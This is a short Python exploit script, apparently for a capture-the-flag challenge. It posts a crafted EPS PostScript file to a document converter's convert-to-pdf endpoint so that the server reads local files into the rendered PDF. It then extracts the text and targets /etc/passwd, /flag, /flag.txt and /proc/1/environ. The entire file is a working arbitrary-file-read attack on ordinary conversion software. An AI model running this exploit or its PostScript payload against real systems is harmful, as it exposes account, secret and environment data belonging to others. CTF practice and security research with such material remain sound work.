#!/usr/bin/env python3
"""Temporary CTF converter probe using a self-contained EPS document."""
import io
import urllib.error
import urllib.request
import uuid
from pypdf import PdfReader

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
EPS = r'''%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 612 792
%%Pages: 1
%%EndComments
/Courier findfont 10 scalefont setfont
/infile (TARGET) (r) file def
/buf 4096 string def
/x 30 def /y 750 def /lineheight 12 def
/newline { /y y lineheight sub def x y moveto } def
x y moveto
{
  infile buf readline
  { show newline }
  { show infile closefile exit }
  ifelse
} bind loop
showpage
%%EOF
'''


def convert(target):
    data = EPS.replace("TARGET", target).encode()
    boundary = "----Arena" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="data"; filename="probe.eps"\r\n'
        "Content-Type: application/postscript\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(BASE + "/cool/convert-to/pdf", data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    req.add_header("Content-Length", str(len(body)))
    print("\n" + "=" * 25, "EPS CONVERT", target, flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(2000000)
            print("STATUS", r.status, "TYPE", r.headers.get("Content-Type"), "BYTES", len(raw), flush=True)
            if raw.startswith(b"%PDF"):
                try:
                    reader = PdfReader(io.BytesIO(raw))
                    print("PDF_TEXT", "\n".join((p.extract_text() or "") for p in reader.pages), flush=True)
                except Exception as e:
                    print("PDF_PARSE_ERROR", repr(e), flush=True)
            else:
                print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP ERROR", e.code, e.headers, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


for path in ("/etc/passwd", "/flag", "/flag.txt", "/proc/1/environ"):
    convert(path)
